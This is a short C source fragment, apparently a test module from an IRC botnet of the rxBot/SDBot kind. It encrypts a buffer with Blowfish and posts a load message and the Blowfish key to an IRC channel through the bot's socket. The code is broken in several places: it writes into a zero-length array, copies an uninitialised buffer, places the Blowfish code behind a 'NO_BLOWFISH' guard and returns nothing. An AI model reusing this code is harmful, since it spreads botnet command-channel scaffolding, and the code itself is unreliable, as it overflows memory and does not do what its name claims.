#include "includes.h"
#include "extern.h"
#ifdef NO_BLOWFISH
int blowtest()
{
	char tstr[256];
	ds dl;
	char szBuffer[bufsize];
	char blowmsg[] = "";
	sprintf(blowmsg,"%s",szBuffer);
	BlowfishCrypt(szBlowfishKey,blowmsg);
	_snprintf(tmpbuf,bufsize,"%s",blowmsg);
	sprintf(msgbuf,"%s\r\n", tmpbuf);
	sprintf(tstr, "-Blowfish- Module[BlowTest] Loaded:\r\n");
	if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
	sprintf(tstr, "-Blowfish- Module[BlowTest] /Blowkey\ %s\r\n",szBlowfishKey);
	if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
		
}
#endif